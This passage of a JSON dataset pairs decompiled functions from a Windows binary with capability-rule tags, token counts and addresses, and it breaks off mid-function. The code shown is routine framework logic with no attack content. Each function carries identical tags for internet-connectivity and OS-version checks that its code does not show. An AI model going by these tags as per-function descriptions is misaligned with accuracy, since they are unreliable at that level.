        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004729f0(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x472a05;\n    fcn.0040630c();\n    uStack36 = 0x472ab2;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    piVar1 = (**(**(in_EAX + 0x34) + 0x214))();\n    uVar3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    iVar2 = (***piVar1)();\n    if (7 < iVar2) {\n        (**(*piVar1 + 0xc))();\n        if (((var_10h != 1) || (var_10h._2_2_ != 0x100)) || (iVar2 + -8 != var_ch)) {\n            uVar3 = 0;\n            fcn.0041e9b0(0, 0);\n        }\n    }\n    (**(*param_2 + 0xc))();\n    *in_FS_OFFSET = uVar3;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 366
    },
    "00472c40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00472c40(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.0046cf68();\n    *(in_EAX + 0xe4) = uVar1;\n    *(in_EAX + 0xe0) = uVar1;\n    fcn.0046d458();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 209
    },
    "00472ec0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00472ec0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    if (*(in_EAX + 0x42) != param_2) {\n        var_1h._0_1_ = param_2;\n        if ((*(in_EAX + 0x34) != 0) && (*(*(in_EAX + 0x34) + 0x6c) != 0)) {\n            puStack28 = 0x472ef5;\n            fcn.0046bd38();\n            uStack32 = 0x472f4b;\n            uStack36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffdc;\n            *(in_EAX + 0x42) = var_1h;\n            puStack28 = &fcn.00472ec0::var_1h + 1;\n            iVar1 = fcn.0046d1c8();\n            if (-1 < iVar1 + -1) {\n                do {\n                    iVar2 = fcn.0046d190();\n                    *(iVar2 + 0x42) = var_1h;\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != 0);\n            }\n            *in_FS_OFFSET = uStack36;\n            puStack28 = 0x472f8b;\n            uStack32 = 0x472f4a;\n            fcn.0046bd70();\n            return;\n        }\n        puStack28 = 0x472f59;\n        fcn.0046d72c();\n        *(in_EAX + 0x42) = var_1h;\n        puStack28 = 0x472f6a;\n        iVar1 = fcn.0046d1c8();\n        if (-1 < iVar1 + -1) {\n            do {\n                puStack28 = 0x472f81;\n                iVar2 = fcn.0046d190();\n                *(iVar2 + 0x42) = var_1h;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 557
    },
    "00472f94": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00472f94(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    *(*(in_EAX + 0xe4) + 8) = *(in_EAX + 0x34);\n    iVar1 = fcn.0046d1c8();\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.0046d190();\n            (**(*piVar2 + 0xb8))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    if ((*(in_EAX + 0x34) != 0) && (*(*(in_EAX + 0x34) + 0xa9) == '\\0')) {\n        fcn.00474bb8();\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00473084": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00473084(uint arg_8h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint in_EAX;\n    int32_t iVar3;\n    int32_t *in_EDX;\n    uint unaff_EBX;\n    int32_t rgIndices;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    iVar3 = 5;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    uStack32 = 0x4731c2;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00473084::var_20h;\n    fcn.004045c8();\n    cVar2 = fcn.00415e1c();\n    if (cVar2 == '\\0') {\n        fcn.00415b34();\n    }\n    else {\n        iVar3 = fcn.00415dc0();\n        fcn.004045c8();\n        if (-1 < iVar3) {\n            iVar3 = iVar3 + 1;\n            rgIndices = 0;\n            do {\n                uVar4 = in_EAX;\n                fcn.00415ea8(&fcn.00473084::var_20h, in_EAX, 1, rgIndices);\n                cVar2 = fcn.00415e1c();\n                if (cVar2 == '\\0') {\n                    fcn.00415b34();\n                }\n                else {\n                    fcn.00473084(arg_8h);\n                }\n                iVar1 = *in_EDX;\n                var_20h = var_8h;\n                fcn.00404948(uVar4, unaff_EBX, iVar1);\n                if (rgIndices == 0) {\n                    var_24h._2_2_ = iVar1 >> 0x10;\n                    var_24h = CONCAT31(CONCAT21(var_24h._2_2_, **0x484688), 1);\n                    fcn.0040308c(uVar4, unaff_EBX, var_24h);\n                    fcn.0040305c();\n                    fcn.0040482c();\n                }\n                rgIndices = rgIndices + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    if (*in_EDX != 0) {\n        fcn.00404948(0x4731e8, *in_EDX, 0x4731dc);\n    }\n    *in_FS_OFFSET = var_20h;\n    puStack28 = 0x4731c9;\n    uStack32 = 0x4731b4;\n    fcn.004104d4();\n    uStack32 = 0x4731c1;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 746
    },
    "00473500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00473500(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xec) == 0) {\n        fcn.00473494(&stack0xfffffffc);\n    }\n    return *(in_EAX + 0xec);\n}\n",
        "token_count": 63
    },
    "004736ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004736ac(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if ((*(in_EAX + 0xfc) == 0) && ((*(*(in_EAX + 0x34) + 0x1c) & 2) == 0)) {\n        uVar1 = (**(**(in_EAX + 0x34) + 0xa4))();\n        *(in_EAX + 0xfc) = uVar1;\n    }\n    return *(in_EAX + 0xfc);\n}\n",
        "token_count": 123
    },
    "00473da0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00473dd4)\n\nvoid fcn.00473da0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x473e09;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.00473e18();\n    fcn.004177f4();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x473e10;\n    uStack28 = 0x473e08;\n    fcn.00405080();\n    return;\n}\n",
        "token_count": 179
    },
    "00473f84": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00473f84(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00473ff8();\n    iVar1 = (*(iVar1 + 0x54) - *(in_EAX + 0xc)) + 1;\n    if (iVar1 < 0) {\n        iVar1 = 0;\n    }\n    iVar2 = fcn.00473ff8();\n    iVar2 = *(iVar2 + 0x50) - *(in_EAX + 0xc);\n    if (iVar2 < 0) {\n        iVar2 = 0;\n    }\n    iVar3 = fcn.00473ff8();\n    if (*(iVar3 + 0x54) < iVar2) {\n        iVar2 = fcn.00473ff8();\n        iVar2 = *(iVar2 + 0x54);\n    }\n    if (*(in_EAX + 0x10) < iVar1) {\n        *(in_EAX + 0x10) = iVar1;\n    }\n    if (iVar2 < *(in_EAX + 0x10)) {\n        *(in_EAX + 0x10) = iVar2;\n    }\n    if (*(in_EAX + 0x10) != 0) {\n        iVar1 = fcn.00473ff8();\n        if (*(iVar1 + 0x54) - *(in_EAX + 0x10) < *(in_EAX + 0xc) + -1) {\n            *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 377
    },
    "00474040": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00474040(void)\n\n{\n    fcn.00474008();\n    fcn.00474030();\n    return;\n}\n",
        "token_count": 31
    },
    "00474134": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00474134(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    cVar1 = *(in_EAX + 0x3a);\n    if (param_2 != cVar1) {\n        *(in_EAX + 0x3a) = param_2;\n        fcn.004742f8();\n        if ((*(in_EAX + 0x1c) & 8) == 0) {\n            if (*(in_EAX + 0x42) != 0) {\n                (**(in_EAX + 0x40))();\n            }\n            if ((cVar1 == '\\0') && (*(in_EAX + 0x4a) != 0)) {\n                (**(in_EAX + 0x48))();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "0047417c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047417c(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x38) != '\\0') && (*(in_EAX + 0x30) != 0)) {\n        fcn.00474134();\n        return;\n    }\n    fcn.00474134();\n    return;\n}\n",
        "token_count": 79
    },
    "004742a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004742a8(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_5h;\n    \n    iVar2 = *(*(in_EAX + 0x34) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            piVar1 = fcn.0041c4c8();\n            if (arg_8h == *(piVar1 + 0x16)) {\n                (**(*piVar1 + 0x14))();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "00474320": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00474320(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 == '\\x06') {\n        fcn.0047417c();\n    }\n    else if (*(in_EAX + 0x3a) != '\\0') {\n        fcn.004742f8();\n        if (param_2 == '\\0') {\n            if (*(in_EAX + 0x4a) != 0) {\n                (**(in_EAX + 0x48))();\n            }\n        }\n        else if (param_2 - 1U < 4) {\n            if (*(in_EAX + 0x4a) != 0) {\n                (**(in_EAX + 0x48))();\n            }\n        }\n        else if ((param_2 - 1U == 4) && (*(in_EAX + 0x52) != 0)) {\n            (**(in_EAX + 0x50))();\n        }\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "004744c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.004744c8(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0042273c();\n    *(in_EAX + 0x22) = 0;\n    iVar1 = fcn.0046c750();\n    in_EAX[0xe] = iVar1;\n    iVar1 = fcn.0046ca6c();\n    in_EAX[0xf] = iVar1;\n    iVar1 = fcn.0046cf68();\n    in_EAX[0xc] = iVar1;\n    iVar1 = fcn.0046ca6c();\n    in_EAX[0x10] = iVar1;\n    iVar1 = fcn.004037f0();\n    in_EAX[0x11] = iVar1;\n    *(in_EAX + 0xa7) = 1;\n    iVar1 = fcn.00474480();\n    in_EAX[0x20] = iVar1;\n    iVar1 = fcn.00403764();\n    in_EAX[0x24] = iVar1;\n    iVar1 = fcn.0046cf68();\n    in_EAX[0xd] = iVar1;\n    *(iVar1 + 0x18) = *0x4745bc;\n    in_EAX[0x26] = 1;\n    (**(*in_EAX + 0x90))();\n    fcn.0040e140();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 446
    },
    "00474930": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00474930(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x474942;\n    fcn.00422b8c();\n    uStack28 = 0x474973;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (*(in_EAX + 0xa3) != '\\0') {\n        puStack24 = &stack0xfffffffc;\n        (**(*in_EAX + 0x178))();\n    }\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 166
    },
    "00474b90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00474b90(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x8c) == 0) {\n        uVar1 = fcn.004037f0();\n        *(in_EAX + 0x8c) = uVar1;\n    }\n    return *(in_EAX + 0x8c);\n}\n",
        "token_count": 91
    },
    "00474bec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00474bec(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x474c38;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (*(in_EAX + 0x88) != '\\0') {\n        fcn.0040675c();\n        fcn.0046bba0();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x474c3f;\n    uStack20 = 0x474c37;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 185
    },
    "00474cc8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00474cc8(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x474d14;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (*(in_EAX + 0x9d) == '\\0') {\n        fcn.0040675c();\n        fcn.0046bba0();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x474d1b;\n    uStack20 = 0x474d13;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 187
    },
    "00474e38": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00474e38(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t *var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    uStack16 = 0x474ea7;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    var_4h = in_EAX;\n    if (*(in_EAX + 0x9d) == '\\f') {\n        fcn.00474e00();\n    }\n    *in_FS_OFFSET = uStack20;\n    puStack12 = 0x474eae;\n    if (*(var_4h + 0xab) == '\\0') {\n        uStack16 = 0x474e9b;\n        fcn.004749a0();\n        uStack16 = 0x474ea6;\n        (**(*var_4h + 0x9c))();\n    }\n    else {\n        uStack16 = 0x474e84;\n        fcn.004749a0();\n        uStack16 = 0x474e8f;\n        (**(*var_4h + 0xcc))();\n    }\n    return;\n}\n",
        "token_count": 288
    },
    "00474fe8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00474fe8(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x474ffb;\n    cVar1 = (**(*in_EAX + 0x204))();\n    if ((cVar1 == '\\0') && ((in_EAX[0x1b] == 0 || (*(in_EAX[0x1b] + 8) == '\\0')))) {\n        uStack20 = 0x475050;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        (**(*in_EAX + 0x16c))();\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x475057;\n        uStack20 = 0x47504f;\n        (**(*in_EAX + 0x9c))();\n        return;\n    }\n    puStack16 = 0x47501a;\n    (**(*in_EAX + 0x1fc))();\n    return;\n}\n",
        "token_count": 275
    },
    "00475068": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00475068(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.0040461c();\n    for (iVar1 = *(param_2 + 0x98); iVar1 != 0; iVar1 = *(iVar1 + 0x98)) {\n        if ((*(iVar1 + 0x40) != '\\x1b') && (*(iVar1 + 0xf0) == '\\0')) {\n            arg_8h = &var_4h;\n            fcn.00409998(arg_8h);\n            fcn.0040461c();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 252
    },
    "00475330": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00475330(int32_t param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uchar *puVar2;\n    uint in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffb8;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x4754a0;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puVar2 = &stack0xfffffffc;\n    if (*(*(param_2 + 0x10) + 0x4841bc) != *(*(param_1 + 0x21) + 0x4841bc)) {\n        fcn.0046dd78();\n        var_18h = 0;\n        var_14h._0_1_ = 0xb;\n        var_10h = *(*(param_2 + 0x10) * 4 + 0x4840f4);\n        var_ch._0_1_ = 0xb;\n        var_8h = *(*(param_1 + 0x21) * 4 + 0x4840f4);\n        var_4h._0_1_ = 0xb;\n        fcn.0040675c(&fcn.00475330::var_18h);\n        fcn.0046bc4c(in_EAX);\n        in_stack_ffffffb8 = in_EAX;\n        puVar2 = puStack60;\n    }\n    puStack60 = puVar2;\n    cVar1 = *(param_2 + 0x10);\n    if (((cVar1 == '\\b') || (cVar1 - 0xcU < 2)) || (cVar1 == '\\x1c')) {\n        iVar3 = (**(*param_2 + 0x88))();\n        iVar4 = fcn.0046c238();\n        if (iVar3 != iVar4) {\n            fcn.0046dd78();\n            var_18h = 0;\n            var_14h._0_1_ = 0xb;\n            var_10h = (**(*param_2 + 0x88))();\n            var_ch._0_1_ = 0;\n            var_8h = fcn.0046c238();\n            var_4h._0_1_ = 0;\n            fcn.0040675c(&fcn.00475330::var_18h);\n            fcn.0046bc4c(in_stack_ffffffb8);\n        }\n    }\n    if ((*(param_2 + 0x10) == '\\x01') || (*(param_2 + 0x10) - 0x17U < 2)) {\n        iVar3 = (**(*param_2 + 0x88))();\n        iVar4 = fcn.0046c238();\n        if ((iVar4 < iVar3) && (*(param_2 + 0x41) == '\\0')) {\n            fcn.0046c238();\n            (**(*param_2 + 0xc4))();\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffb8;\n    uStack64 = 0x4754a7;\n    uStack68 = 0x47549f;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 845
    },
    "004754ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004754ec(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x475504;\n    fcn.00475980();\n    puStack28 = 0x47550f;\n    fcn.004039dc();\n    puStack28 = 0x47551d;\n    piVar1 = (**(*in_EAX + 0x214))();\n    uStack32 = 0x475593;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    iVar2 = (***piVar1)();\n    if (0 < iVar2) {\n        iVar3 = fcn.0040583c();\n        if (iVar3 <= iVar2) {\n            iVar3 = iVar2;\n            if (iVar2 < 0) {\n                iVar3 = iVar2 + 3;\n            }\n            fcn.00405a18((iVar3 >> 2) + iVar2);\n        }\n        (**(*piVar1 + 0xc))();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x47559a;\n    uStack32 = 0x475592;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 346
    },
    "004755cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004755cc(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint in_ECX;\n    int32_t *in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack4144;\n    uint uStack4140;\n    uchar *puStack4136;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack4136 = &stack0xfffffffc;\n    piVar1 = 0x2;\n    do {\n        piVar3 = piVar1;\n        piVar1 = piVar3 + -1;\n    } while (piVar3 + -1 != NULL);\n    uStack4140 = 0x4756d9;\n    uStack4144 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefd0;\n    if (arg_8h == '\\0') {\n        iVar4 = (**(*in_EDX + 0x70))();\n        if (iVar4 < 0x2001) {\n            cVar2 = (**(*piVar3 + 0x230))();\n            if (cVar2 != '\\0') {\n                (**(*piVar3 + 0xa8))(0, in_ECX);\n            }\n        }\n        else {\n            (**(*in_EDX + 0x70))();\n            fcn.00404c14();\n            fcn.00404a88();\n            cVar2 = (**(*piVar3 + 0x230))();\n            if (*(in_EDX + 0x10) == '\\x01') {\n                